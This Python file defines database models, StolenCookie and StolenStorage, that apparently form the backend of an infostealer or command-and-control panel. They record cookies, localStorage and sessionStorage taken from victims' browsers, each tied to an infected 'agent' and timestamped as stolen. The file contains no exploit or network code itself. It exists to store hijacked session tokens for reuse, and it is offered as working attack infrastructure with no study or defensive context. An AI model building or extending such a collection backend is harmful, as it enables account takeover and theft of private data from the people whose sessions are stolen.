"""
Cookie/Session theft model
"""
from datetime import datetime
from . import db


class StolenCookie(db.Model):
    """Stolen cookies and session data"""
    __tablename__ = 'stolen_cookies'
    
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.Integer, db.ForeignKey('agents.id'), nullable=False)
    
    # Cookie data
    domain = db.Column(db.String(255))
    name = db.Column(db.String(255))
    value = db.Column(db.Text)
    
    # Cookie attributes
    path = db.Column(db.String(255))
    expires = db.Column(db.String(100))
    secure = db.Column(db.Boolean, default=False)
    http_only = db.Column(db.Boolean, default=False)
    same_site = db.Column(db.String(50))
    
    # Metadata
    stolen_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    def to_dict(self):
        return {
            'id': self.id,
            'agent_id': self.agent_id,
            'domain': self.domain,
            'name': self.name,
            'value': self.value,
            'path': self.path,
            'expires': self.expires,
            'secure': self.secure,
            'http_only': self.http_only,
            'same_site': self.same_site,
            'stolen_at': self.stolen_at.isoformat() if self.stolen_at else None
        }


class StolenStorage(db.Model):
    """Stolen localStorage and sessionStorage"""
    __tablename__ = 'stolen_storage'
    
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.Integer, db.ForeignKey('agents.id'), nullable=False)
    
    # Storage data
    storage_type = db.Column(db.String(50))  # localStorage or sessionStorage
    domain = db.Column(db.String(255))
    key = db.Column(db.String(255))
    value = db.Column(db.Text)
    
    # Metadata
    stolen_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    def to_dict(self):
        return {
            'id': self.id,
            'agent_id': self.agent_id,
            'storage_type': self.storage_type,
            'domain': self.domain,
            'key': self.key,
            'value': self.value,
            'stolen_at': self.stolen_at.isoformat() if self.stolen_at else None
        }
